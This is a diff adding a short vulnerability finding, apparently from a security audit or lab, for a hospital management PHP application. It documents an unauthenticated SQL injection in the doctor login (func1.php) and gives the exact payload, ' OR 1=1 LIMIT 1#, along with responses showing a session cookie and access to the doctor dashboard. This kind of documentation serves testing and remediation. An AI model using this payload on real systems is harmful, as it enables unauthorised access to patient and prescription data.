@@ -1,0 +1,10 @@
+HMS-05: Unauthenticated doctor login SQL injection -> auth bypass
+Sink: func1.php:7-9  "select * from doctb where username='$dname' and password='$dpass';"
+Entry: POST /func1.php (docsub1=1, username3, password3)
+
+    baseline: POST /func1.php  docsub1=1&username3=nodoc&password3=wrong
+              -> HTTP 200 in 0.028s (invalid-credentials alert)
+    payload:  POST /func1.php  docsub1=1&username3=%27+OR+1%3D1+LIMIT+1%23&password3=x
+              -> HTTP 302, Location: doctor-panel.php, Set-Cookie: PHPSESSID=...
+    Session proof: GET /doctor-panel.php with the cookie renders the doctor dashboard
+              (appointment/prescription tables, seed doctor data shown).
